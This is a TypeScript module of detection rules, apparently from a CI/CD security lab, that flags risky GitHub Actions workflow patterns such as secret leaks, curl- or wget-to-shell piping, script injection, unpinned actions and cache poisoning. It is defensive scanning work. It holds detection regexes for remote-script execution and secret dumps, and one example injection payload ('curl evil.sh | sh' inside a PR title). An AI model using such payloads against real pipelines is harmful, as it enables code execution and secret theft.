import type { Job, PermissionsConfig, SecurityFinding, Step, WorkflowFile } from '@cicd-lab/shared';

export type RuleSeverity = SecurityFinding['severity'];

export interface RuleContext {
  workflow: WorkflowFile;
  rawYaml: string;
}

export interface RuleFinding extends SecurityFinding {
  /** Stable rule identifier, e.g. `interpolation-in-run`. */
  ruleId: string;
}

/**
 * A detection rule: pure function over the parsed workflow plus raw YAML.
 * `whyItMatters` is attacker-view (1–2 sentences), `fixHint` tells how to
 * fix without giving a full solution, `reference` deep-links the web guide.
 */
export interface DetectionRule {
  id: string;
  severity: RuleSeverity;
  category: string;
  summary: string;
  whyItMatters: string;
  fixHint: string;
  reference?: string;
  detect(ctx: RuleContext): RuleFinding[];
}

export function defineRule(rule: DetectionRule): DetectionRule {
  return rule;
}

interface StepSite {
  jobId: string;
  stepIndex: number;
  step: Step;
}

function eachStep(workflow: WorkflowFile): StepSite[] {
  const sites: StepSite[] = [];
  for (const [jobId, job] of Object.entries(workflow.jobs)) {
    (job.steps || []).forEach((step, stepIndex) => sites.push({ jobId, stepIndex, step }));
  }
  return sites;
}

interface EnvSite {
  scope: string;
  key: string;
  value: string;
}

function eachEnvValue(workflow: WorkflowFile): EnvSite[] {
  const sites: EnvSite[] = [];
  const collect = (scope: string, env?: Record<string, string>) => {
    for (const [key, value] of Object.entries(env || {})) {
      if (typeof value === 'string') sites.push({ scope, key, value });
    }
  };
  collect('workflow env', workflow.env);
  for (const [jobId, job] of Object.entries(workflow.jobs)) {
    collect(`job "${jobId}" env`, (job as Job).env);
    ((job as Job).steps || []).forEach((step, i) => {
      collect(`step ${i + 1} env`, step.env);
      for (const [key, value] of Object.entries(step.with || {})) {
        if (typeof value === 'string') sites.push({ scope: `step ${i + 1} with`, key, value });
      }
    });
  }
  return sites;
}

/** 1-based line number of the first occurrence of `snippet` in raw YAML. */
export function lineOf(rawYaml: string, snippet: string): number | undefined {
  if (!snippet) return undefined;
  const idx = rawYaml.indexOf(snippet);
  if (idx < 0) return undefined;
  return rawYaml.slice(0, idx).split('\n').length;
}

/** Non-empty run-script lines with their 1-based position inside the script. */
function runLines(step: Step): { text: string; offset: number }[] {
  if (!step.run) return [];
  return step.run.split('\n').map((text, offset) => ({ text, offset }));
}

function makeFinding(
  rule: DetectionRule,
  message: string,
  snippet?: string,
  ctx?: RuleContext,
): RuleFinding {
  return {
    ruleId: rule.id,
    severity: rule.severity,
    category: rule.category,
    message,
    line: ctx && snippet ? lineOf(ctx.rawYaml, snippet) : undefined,
    remediation: rule.fixHint,
  };
}

const GHA_REF = '/reference/github-actions';

const secretsEchoExpression = defineRule({
  id: 'secrets-echo-expression',
  severity: 'high',
  category: 'secrets',
  summary: 'Secret interpolated into shell output',
  whyItMatters:
    'Expressions are evaluated before the shell runs, so the secret value lands in plaintext logs readable by anyone with run access.',
  fixHint: 'Pass secrets via env: and never print them; mask values with ::add-mask::.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        // ::add-mask:: is the documented masking pattern, not a leak.
        if (/add-mask/i.test(text)) continue;
        if (/echo[^\n]*\$\{\{\s*secrets\./.test(text)) {
          out.push(
            makeFinding(
              secretsEchoExpression,
              `Secret may be echoed to logs via expression interpolation in step "${step.name || 'unnamed'}"`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const envDump = defineRule({
  id: 'env-dump',
  severity: 'high',
  category: 'secrets',
  summary: 'Environment dump in run script',
  whyItMatters:
    'Dumping the environment prints every secret available to the job, including the automatic GITHUB_TOKEN.',
  fixHint: 'Inspect single variables instead of the whole environment.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/\bprintenv\b/.test(text) || /(^|[;&|\s])env(\s|$|[;&|])/.test(text)) {
          out.push(
            makeFinding(
              envDump,
              `Environment dump may expose secrets in step "${step.name || 'unnamed'}"`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const AWS_KEY_RE = /AKIA[0-9A-Z]{16}/;

const awsAccessKey = defineRule({
  id: 'aws-access-key',
  severity: 'high',
  category: 'secrets',
  summary: 'Long-lived AWS key in workflow',
  whyItMatters:
    'Static access keys never expire on their own; once committed they work for anyone until manually revoked.',
  fixHint: 'Use OIDC (role-to-assume + id-token: write) instead of static keys.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    const seen = new Set<string>();
    const flag = (where: string, snippet: string) => {
      const key = `${where}:${snippet}`;
      if (seen.has(key)) return;
      seen.add(key);
      out.push(
        makeFinding(awsAccessKey, `AWS Access Key ID detected in ${where}`, snippet, {
          workflow,
          rawYaml,
        }),
      );
    };
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        const m = text.match(AWS_KEY_RE);
        if (m) flag(`step "${step.name || 'unnamed'}"`, m[0]);
      }
    }
    for (const site of eachEnvValue(workflow)) {
      const m = site.value.match(AWS_KEY_RE);
      if (m) flag(`${site.scope} ("${site.key}")`, m[0]);
    }
    return out;
  },
});

const CRED_KEY_RE =
  /([\w.-]*(password|passwd|secret|token|api[_-]?key|[_-]pass\b|[_-]pwd\b)[\w.-]*)\s*[:=]\s*["']?([^"'`\s][^"'`\n]*)/i;

const hardcodedCredential = defineRule({
  id: 'hardcoded-credential',
  severity: 'high',
  category: 'secrets',
  summary: 'Credential assigned in plaintext',
  whyItMatters:
    'Anyone with read access to the workflow — including fork contributors via logs — learns a working credential.',
  fixHint: 'Reference secrets (secrets.NAME) or a secrets manager; never assign credential values inline.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    const flag = (where: string, key: string, snippet: string, seen: Set<string>) => {
      const k = `${where}:${key}`;
      if (seen.has(k)) return;
      seen.add(k);
      out.push(
        makeFinding(hardcodedCredential, `Hardcoded credential "${key}" in ${where}`, snippet, {
          workflow,
          rawYaml,
        }),
      );
    };
    const seen = new Set<string>();
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        // OIDC issuer URLs in trust policies are identity metadata, not credentials.
        if (/token\.actions\.githubusercontent\.com/i.test(text)) continue;
        const m = text.match(CRED_KEY_RE);
        if (m && !m[3].includes('${{')) flag(`step "${step.name || 'unnamed'}"`, m[1], text.trim(), seen);
      }
    }
    for (const site of eachEnvValue(workflow)) {
      if (site.value.includes('${{')) continue;
      const m = `${site.key}=${site.value}`.match(CRED_KEY_RE);
      if (m && m[3].trim()) flag(`${site.scope}`, site.key, site.value, seen);
    }
    return out;
  },
});

const curlPipeShell = defineRule({
  id: 'curl-pipe-shell',
  severity: 'critical',
  category: 'supply-chain',
  summary: 'Remote script piped to shell via curl',
  whyItMatters:
    'The executed bytes are whatever the server returns at runtime — a compromised CDN or repo ships malware straight into the runner.',
  fixHint: 'Download the file, verify its checksum, then execute.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/curl.*\|\s*(ba)?sh/.test(text)) {
          out.push(
            makeFinding(
              curlPipeShell,
              `Piping curl output to shell in step "${step.name || 'unnamed'}" — supply chain attack vector`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const wgetPipeShell = defineRule({
  id: 'wget-pipe-shell',
  severity: 'critical',
  category: 'supply-chain',
  summary: 'Remote script piped to shell via wget',
  whyItMatters:
    'The executed bytes are whatever the server returns at runtime — a compromised source ships malware straight into the runner.',
  fixHint: 'Download the file, verify its checksum, then execute.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/wget.*\|\s*(ba)?sh/.test(text)) {
          out.push(
            makeFinding(
              wgetPipeShell,
              `Piping wget output to shell in step "${step.name || 'unnamed'}" — supply chain attack vector`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const errorSwallow = defineRule({
  id: 'error-swallow',
  severity: 'medium',
  category: 'reliability',
  summary: 'Build errors swallowed with || echo',
  whyItMatters:
    'Masked failures let broken or vulnerable artifacts proceed down the pipeline as if they passed.',
  fixHint: 'Let build failures propagate naturally; gate deploys on success.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/\|\|\s*echo/.test(text)) {
          out.push(
            makeFinding(
              errorSwallow,
              `Build errors silently swallowed with "|| echo" in step "${step.name || 'unnamed'}"`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const INTERPOLATION_RE = /\$\{\{\s*(github\.event\.|github\.head_ref|github\.ref(_name)?|inputs\.|needs\.|steps\.|matrix\.)/;

const interpolationInRun = defineRule({
  id: 'interpolation-in-run',
  severity: 'high',
  category: 'injection',
  summary: 'Untrusted context interpolated into run script',
  whyItMatters:
    'Expressions are substituted before the shell starts, so attacker-controlled values (PR titles, issue bodies, workflow inputs) become live shell code. A crafted title like `"; curl evil.sh | sh; echo "` executes with the job token.',
  fixHint:
    'Pass the value through an intermediate env: variable and quote it ("$VAR") instead of interpolating ${{ }} inside run:.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        const m = text.match(INTERPOLATION_RE);
        if (m) {
          out.push(
            makeFinding(
              interpolationInRun,
              `Direct interpolation of "${m[0]}" in step "${step.name || 'unnamed'}" enables script injection`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const USES_RE = /^([^@\s]+)@(\S+)\s*$/;
const SHA_RE = /^[0-9a-f]{40}$/;

const unpinnedUses = defineRule({
  id: 'unpinned-uses',
  severity: 'medium',
  category: 'supply-chain',
  summary: 'Action not pinned to full commit SHA',
  whyItMatters:
    'Mutable tags and branches can be moved by the action owner — or an attacker who compromises it — so the next run executes different code. SHAs can even be spoofed across forks (impostor commits), so the SHA must belong to the trusted repo.',
  fixHint:
    'Pin every third-party action to its full 40-character commit SHA with the version in a trailing comment, and let Dependabot propose updates.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      if (!step.uses || step.uses.startsWith('./')) continue;
      const m = step.uses.match(USES_RE);
      if (m && !SHA_RE.test(m[2])) {
        out.push(
          makeFinding(
            unpinnedUses,
            `Action "${m[1]}" pinned to mutable ref "@${m[2]}" instead of a full commit SHA`,
            step.uses,
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

function triggerNames(workflow: WorkflowFile): string[] {
  const on = workflow.on;
  if (typeof on === 'string') return [on];
  if (Array.isArray(on)) return on.filter((t): t is string => typeof t === 'string');
  if (typeof on === 'object' && on !== null) return Object.keys(on);
  return [];
}

const prTargetCheckout = defineRule({
  id: 'pr-target-untrusted-checkout',
  severity: 'high',
  category: 'flow-control',
  summary: 'Fork code checked out under pull_request_target',
  whyItMatters:
    'pull_request_target runs with base-repo secrets and a write token. Checking out the fork head (ref: pull/…/merge, head.sha, or repository: head.repo) and executing it is a pwn request — the classic fork-PR RCE. actions/checkout v7+ refuses these patterns by default.',
  fixHint:
    'Do not check out fork code in pull_request_target; use the pull_request event or a maintainer-approved trusted SHA instead.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    if (!triggerNames(workflow).includes('pull_request_target')) return [];
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      if (!step.uses || !/checkout@/i.test(step.uses)) continue;
      const withBlock = step.with || {};
      const ref = String(withBlock.ref || '');
      const repo = String(withBlock.repository || '');
      const dangerous =
        /pull\/\d+\/(head|merge)/.test(ref) ||
        /head\.sha/.test(ref) ||
        /head\.repo/.test(repo);
      if (dangerous) {
        out.push(
          makeFinding(
            prTargetCheckout,
            `Untrusted fork checkout ("${ref || repo}") under pull_request_target in step "${step.name || 'unnamed'}"`,
            step.uses,
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

const missingPermissions = defineRule({
  id: 'missing-explicit-permissions',
  severity: 'medium',
  category: 'permissions',
  summary: 'No explicit token permissions',
  whyItMatters:
    'Without an explicit block the job inherits broad repository defaults, so any compromised step can use the token far beyond the job needs.',
  fixHint:
    'Set top-level `permissions: {}` and grant each job only the scopes it needs (least privilege).',
  reference: GHA_REF,
  detect: ({ workflow }) => {
    // Any declared block counts as explicit — including top-level `{}` (deny by default).
    const topLevel = workflow.permissions !== undefined;
    const anyJob = Object.values(workflow.jobs).some(
      (job) => (job as Job).permissions !== undefined,
    );
    if (!topLevel && !anyJob) {
      return [
        {
          ruleId: missingPermissions.id,
          severity: missingPermissions.severity,
          category: missingPermissions.category,
          message: 'Workflow relies on default token permissions — declare explicit permissions',
          remediation: missingPermissions.fixHint,
        },
      ];
    }
    return [];
  },
});

const selfHostedRunner = defineRule({
  id: 'self-hosted-runner',
  severity: 'medium',
  category: 'supply-chain',
  summary: 'Jobs run on self-hosted runners',
  whyItMatters:
    'Persistent self-hosted runners keep filesystem, tool caches, and credentials between jobs — one malicious job can poison every later run on that machine.',
  fixHint:
    'Prefer ephemeral GitHub-hosted runners; when self-hosted is required, isolate the runner and wipe state after each job.',
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const [jobId, job] of Object.entries(workflow.jobs)) {
      const runsOn = (job as Job)['runs-on'];
      const labels = Array.isArray(runsOn) ? runsOn : typeof runsOn === 'string' ? [runsOn] : [];
      if (labels.includes('self-hosted')) {
        out.push(
          makeFinding(
            selfHostedRunner,
            `Job "${jobId}" runs on a self-hosted runner`,
            'self-hosted',
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

/** First-word deploy commands, matched per shell segment. `echo`/`printf` lines never count. */
const DEPLOY_CMD_RE =
  /^(sudo\s+)?(npm\s+publish|pnpm\s+publish|twine\s+upload|gradle\s+publish|mvn\s+\S*\s*deploy|goreleaser(\s+release)?|semantic-release|gh\s+release\s+(create|upload)|nuget\s+push|helm\s+(push|upgrade)|docker\s+push|kubectl\s+(apply|rollout)|terraform\s+apply|pulumi\s+up|aws\s+(s3\s+sync|s3\s+cp|cloudformation\s+deploy|ecs\s+update-service)|az\s+webapp\b.*deploy|az\s+deployment\b|gcloud\s+\S*\s+deploy|serverless\s+deploy|ansible-playbook\b|(\.\/)?deploy\.sh\b|fab\s+\S*\s+deploy|cap\s+\S*\s+deploy)\b/i;

/** Shell segments that actually execute something (drops echo/printf/comments). */
function codeSegments(run: string | undefined): string[] {
  if (!run) return [];
  return run
    .split(/\n|&&|\|\||;|\|/)
    .map((s) => s.trim())
    .filter(Boolean)
    .filter((seg) => !/^(echo|printf|#)/i.test(seg));
}

function stepRunsDeployCommand(step: Step): boolean {
  if (!step.run) return false;
  return step.run
    .split(/\n|&&|\|\||;|\|/)
    .map((s) => s.trim())
    .filter(Boolean)
    .some((seg) => !/^(echo|printf|#)/i.test(seg) && DEPLOY_CMD_RE.test(seg));
}

const CACHE_USES_RE = /actions\/cache(\/|@|$)/i;
const PUBLISH_USES_RE = /(semantic-release|goreleaser|gh-release|pypi-publish|twine|nuget|chart-releaser)/i;
/** Prod intent from identifiers only — never from run bodies (`echo "Deploying to production"` is not a deploy). */
const PROD_NAME_RE = /\bprod(uction)?s?\b|\blive\b/i;

function isPublishContext(workflow: WorkflowFile): boolean {
  if (triggerNames(workflow).includes('release')) return true;
  return eachStep(workflow).some(
    ({ step }) =>
      (step.run != null && stepRunsDeployCommand(step)) ||
      (step.uses != null && PUBLISH_USES_RE.test(step.uses)),
  );
}

const cacheInPublish = defineRule({
  id: 'cache-in-publish',
  severity: 'high',
  category: 'supply-chain',
  summary: 'Cache restored inside a release/publish workflow',
  whyItMatters:
    'Caches are shared across runs: a poisoned entry written by a low-privilege run is restored by the release job and shipped with production credentials. This exact chain published malware under a trusted identity in CVE-2026-45321.',
  fixHint:
    'Remove actions/cache from release and publish jobs; install dependencies fresh on every release build.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    if (!isPublishContext(workflow)) return [];
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      if (step.uses && CACHE_USES_RE.test(step.uses)) {
        out.push(
          makeFinding(
            cacheInPublish,
            `Cache restored in a publish context (step "${step.name || 'unnamed'}") — poisoned entries ship with the release`,
            step.uses,
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

const prodDeployWithoutEnvironment = defineRule({
  id: 'prod-deploy-without-environment',
  severity: 'high',
  category: 'deployments',
  summary: 'Production deploy job has no environment gate',
  whyItMatters:
    'Without an environment gate there are no required reviewers, wait timers, or branch policies: any run that reaches the job deploys to production with prod secrets available.',
  fixHint:
    'Add `environment: production` to the deploy job and configure required reviewers plus branch policy in repository Settings > Environments.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const [jobId, job] of Object.entries(workflow.jobs)) {
      const j = job as Job;
      const envName = typeof j.environment === 'string' ? j.environment : undefined;
      if (envName && /prod(uction)?|live/i.test(envName)) continue;
      const targetsProd =
        PROD_NAME_RE.test(jobId) ||
        PROD_NAME_RE.test(j.name || '') ||
        (j.steps || []).some((s) => PROD_NAME_RE.test(s.name || ''));
      if (!targetsProd) continue;
      const deploys = (j.steps || []).some(
        (s) =>
          stepRunsDeployCommand(s) ||
          (s.uses != null &&
            !s.uses.startsWith('./') &&
            /deploy/i.test(s.uses) &&
            !/setup-|checkout|cache|artifact/i.test(s.uses)),
      );
      if (!deploys) continue;
      out.push(
        makeFinding(
          prodDeployWithoutEnvironment,
          `Job "${jobId}" deploys to production without an environment gate`,
          jobId,
          { workflow, rawYaml },
        ),
      );
    }
    return out;
  },
});

const DOCKER_REF = '/reference/docker';

const unpinnedBaseImage = defineRule({
  id: 'unpinned-base-image',
  severity: 'medium',
  category: 'supply-chain',
  summary: 'Dockerfile FROM line not pinned to a digest',
  whyItMatters:
    'Mutable tags resolve to different bytes over time: a compromised or rebuilt tag changes what your pipeline builds with no diff in your repository.',
  fixHint:
    'Pin every FROM to tag@sha256:digest and refresh with docker buildx imagetools inspect (Dependabot docker updates digests automatically).',
  reference: DOCKER_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      if (!step.run) continue;
      for (const line of step.run.split('\n')) {
        const text = line.trim();
        if (!/^FROM\s+\S+/i.test(text)) continue;
        if (/@sha256:/i.test(text)) continue;
        out.push(
          makeFinding(
            unpinnedBaseImage,
            `Unpinned base image "${text}" — pin to tag@sha256:digest`,
            text,
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

const ATTEST_USES_RE = /actions\/attest(-build-provenance)?@|slsa-github-generator/i;

const missingProvenance = defineRule({
  id: 'missing-provenance',
  severity: 'medium',
  category: 'supply-chain',
  summary: 'Release publishes artifacts with no provenance attestation',
  whyItMatters:
    'Without signed provenance, consumers cannot tell whether an artifact came from your pipeline or an impostor; attestations bind each artifact to its exact build.',
  fixHint:
    'Add actions/attest with subject-path plus id-token and attestations write permissions; generate an SBOM with anchore/sbom-action.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    if (!isPublishContext(workflow)) return [];
    const hasAttest = eachStep(workflow).some(
      ({ step }) => step.uses != null && ATTEST_USES_RE.test(step.uses),
    );
    if (hasAttest) return [];
    let snippet = 'release';
    for (const { step } of eachStep(workflow)) {
      if (step.run && stepRunsDeployCommand(step)) {
        snippet = codeSegments(step.run)[0] || snippet;
        break;
      }
    }
    return [
      makeFinding(
        missingProvenance,
        'Publish workflow has no provenance attestation (actions/attest or SLSA generator)',
        snippet,
        { workflow, rawYaml },
      ),
    ];
  },
});

const COSIGN_USES_RE = /cosign/i;

function stepSignsImage(step: Step): boolean {
  if (step.uses && COSIGN_USES_RE.test(step.uses)) return true;
  return codeSegments(step.run).some((seg) => /cosign\s+sign\b/i.test(seg));
}

function stepPushesImage(step: Step): boolean {
  if (step.uses && /build-push-action/i.test(step.uses)) return true;
  if (step.with && typeof step.with.push === 'string' && /^\s*true\s*$/i.test(step.with.push)) {
    return true;
  }
  return codeSegments(step.run).some((seg) => /^docker\s+push\b/i.test(seg));
}

const unsignedImagePush = defineRule({
  id: 'unsigned-image-push',
  severity: 'medium',
  category: 'supply-chain',
  summary: 'Container image pushed without a signature',
  whyItMatters:
    'Unsigned images let registries and clusters accept anything under the tag; keyless cosign signatures bind the digest to your OIDC identity so consumers verify before running.',
  fixHint:
    'Sign the pushed digest with cosign (keyless via id-token: write) installed from sigstore/cosign-installer.',
  reference: DOCKER_REF,
  detect: ({ workflow, rawYaml }) => {
    const pushes = eachStep(workflow).some(({ step }) => stepPushesImage(step));
    if (!pushes) return [];
    const signed = eachStep(workflow).some(({ step }) => stepSignsImage(step));
    if (signed) return [];
    let snippet = 'docker push';
    for (const { step } of eachStep(workflow)) {
      if (stepPushesImage(step)) {
        snippet = (step.uses || codeSegments(step.run)[0] || snippet).trim();
        break;
      }
    }
    return [
      makeFinding(
        unsignedImagePush,
        'Image pushed without a cosign signature — consumers cannot verify what they run',
        snippet,
        { workflow, rawYaml },
      ),
    ];
  },
});

const OIDC_SUB_RE = /token\.actions\.githubusercontent\.com:sub/i;

const broadOidcTrust = defineRule({
  id: 'broad-oidc-trust',
  severity: 'high',
  category: 'permissions',
  summary: 'OIDC trust policy allows more than the deploying repo',
  whyItMatters:
    'A wildcard sub lets any repository in the organization mint tokens for your role: a malicious repo assumes it and reaches your cloud resources with a trusted identity.',
  fixHint:
    'Scope the sub condition to one repository and ref, e.g. repo:org/app:ref:refs/heads/main with StringEquals.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      if (!step.run) continue;
      for (const { text } of runLines(step)) {
        if (!OIDC_SUB_RE.test(text)) continue;
        const value = text.split('sub')[1] || '';
        if (/\*/.test(value)) {
          out.push(
            makeFinding(
              broadOidcTrust,
              `Overly broad OIDC trust: sub allows more than one repo/ref in step "${step.name || 'unnamed'}"`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const CONFIGURE_AWS_RE = /configure-aws-credentials@/i;

function hasIdTokenWrite(workflow: WorkflowFile): boolean {
  const top = workflow.permissions;
  if (top && typeof top === 'object' && (top as PermissionsConfig)['id-token'] === 'write') {
    return true;
  }
  return Object.values(workflow.jobs).some((j) => {
    const p = (j as Job).permissions;
    return !!p && typeof p === 'object' && (p as PermissionsConfig)['id-token'] === 'write';
  });
}

const oidcMissingIdToken = defineRule({
  id: 'oidc-missing-id-token',
  severity: 'high',
  category: 'permissions',
  summary: 'OIDC role assumption without id-token: write',
  whyItMatters:
    'Without id-token: write GitHub mints no OIDC token, so the role assumption fails at runtime — or teams work around it by reintroducing static keys.',
  fixHint: 'Add id-token: write to the workflow or job permissions alongside role-to-assume.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    if (hasIdTokenWrite(workflow)) return [];
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      if (
        step.uses &&
        CONFIGURE_AWS_RE.test(step.uses) &&
        step.with &&
        typeof step.with['role-to-assume'] === 'string'
      ) {
        out.push(
          makeFinding(
            oidcMissingIdToken,
            `OIDC role assumption in step "${step.name || 'unnamed'}" has no id-token: write permission`,
            step.uses,
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

const secretsJsonDump = defineRule({
  id: 'secrets-json-dump',
  severity: 'high',
  category: 'secrets',
  summary: 'Entire secrets context dumped to logs',
  whyItMatters:
    'toJSON(secrets) prints every secret available to the job in one line, readable by anyone with run access and stored as long as the logs.',
  fixHint: 'Reference single secrets per step via env: and never serialize the whole secrets context.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const { step } of eachStep(workflow)) {
      for (const { text } of runLines(step)) {
        if (/toJSON\s*\(\s*secrets\s*\)/.test(text)) {
          out.push(
            makeFinding(
              secretsJsonDump,
              `Whole secrets context serialized in step "${step.name || 'unnamed'}"`,
              text.trim(),
              { workflow, rawYaml },
            ),
          );
        }
      }
    }
    return out;
  },
});

const CHECKOUT_USES_RE = /actions\/checkout@/i;

const runnerGhostCredentials = defineRule({
  id: 'runner-ghost-credentials',
  severity: 'medium',
  category: 'supply-chain',
  summary: 'Persistent runner keeps checkout credentials on disk',
  whyItMatters:
    'Checkout stores the token in .git/config by default; on a persistent self-hosted runner that credential — plus the whole workspace — survives into later jobs, including untrusted ones.',
  fixHint:
    'Set persist-credentials: false on checkouts that never push, and prefer ephemeral single-job runners.',
  reference: GHA_REF,
  detect: ({ workflow, rawYaml }) => {
    const out: RuleFinding[] = [];
    for (const [jobId, job] of Object.entries(workflow.jobs)) {
      const j = job as Job;
      const runsOn = j['runs-on'];
      const labels = Array.isArray(runsOn) ? runsOn : typeof runsOn === 'string' ? [runsOn] : [];
      if (!labels.includes('self-hosted')) continue;
      for (const step of j.steps || []) {
        if (!step.uses || !CHECKOUT_USES_RE.test(step.uses)) continue;
        // NOTE: js-yaml parses `persist-credentials: false` as boolean false.
        const raw = step.with
          ? (step.with as Record<string, unknown>)['persist-credentials']
          : undefined;
        if (raw === false || (typeof raw === 'string' && raw.trim().toLowerCase() === 'false')) {
          continue;
        }
        out.push(
          makeFinding(
            runnerGhostCredentials,
            `Checkout on persistent runner (job "${jobId}") keeps credentials on disk — set persist-credentials: false`,
            step.uses,
            { workflow, rawYaml },
          ),
        );
      }
    }
    return out;
  },
});

const SCANNER_USES_RE = /(trivy-action|grype-action|gitleaks-action|semgrep|codeql-action\/analyze)/i;
const UPLOAD_SARIF_RE = /upload-sarif@/i;

function stepRunsScanner(step: Step): boolean {
  if (step.uses && SCANNER_USES_RE.test(step.uses)) return true;
  return codeSegments(step.run).some((seg) =>
    /^(sudo\s+)?(trivy|grype|gitleaks|semgrep|codeql)\b/i.test(seg),
  );
}

function hasSecurityEventsWrite(workflow: WorkflowFile): boolean {
  const top = workflow.permissions;
  if (top && typeof top === 'object' && (top as PermissionsConfig)['security-events'] === 'write') {
    return true;
  }
  return Object.values(workflow.jobs).some((j) => {
    const p = (j as Job).permissions;
    return !!p && typeof p === 'object' && (p as PermissionsConfig)['security-events'] === 'write';
  });
}

const scanWithoutSarif = defineRule({
  id: 'scan-without-sarif',
  severity: 'medium',
  category: 'monitoring',
  summary: 'Security scan results never become alerts',
  whyItMatters:
    'A scanner whose SARIF is never uploaded produces no code-scanning alerts: the run stays green while findings sit unread in logs or artifacts.',
  fixHint:
    'Upload results with github/codeql-action/upload-sarif and grant security-events: write.',
  reference: '/reference/monitoring',
  detect: ({ workflow, rawYaml }) => {
    const sites = eachStep(workflow);
    if (!sites.some(({ step }) => stepRunsScanner(step))) return [];
    const uploads = sites.some(({ step }) => step.uses != null && UPLOAD_SARIF_RE.test(step.uses));
    if (!uploads) {
      let snippet = 'upload-sarif';
      for (const { step } of sites) {
        if (stepRunsScanner(step)) {
          snippet = (step.uses || codeSegments(step.run)[0] || snippet).trim();
          break;
        }
      }
      return [
        makeFinding(
          scanWithoutSarif,
          'Security scan runs but no SARIF upload — findings never become alerts',
          snippet,
          { workflow, rawYaml },
        ),
      ];
    }
    if (!hasSecurityEventsWrite(workflow)) {
      return [
        makeFinding(
          scanWithoutSarif,
          'SARIF upload without security-events: write — the upload is rejected and no alerts appear',
          'upload-sarif',
          { workflow, rawYaml },
        ),
      ];
    }
    return [];
  },
});

/** Registry in stable evaluation order. */
export const RULES: DetectionRule[] = [
  secretsEchoExpression,
  envDump,
  awsAccessKey,
  hardcodedCredential,
  curlPipeShell,
  wgetPipeShell,
  errorSwallow,
  interpolationInRun,
  unpinnedUses,
  prTargetCheckout,
  missingPermissions,
  selfHostedRunner,
  cacheInPublish,
  prodDeployWithoutEnvironment,
  unpinnedBaseImage,
  missingProvenance,
  unsignedImagePush,
  broadOidcTrust,
  oidcMissingIdToken,
  secretsJsonDump,
  runnerGhostCredentials,
  scanWithoutSarif,
];

export function runRules(ctx: RuleContext): RuleFinding[] {
  return RULES.flatMap((rule) => {
    try {
      return rule.detect(ctx);
    } catch {
      return [];
    }
  });
}
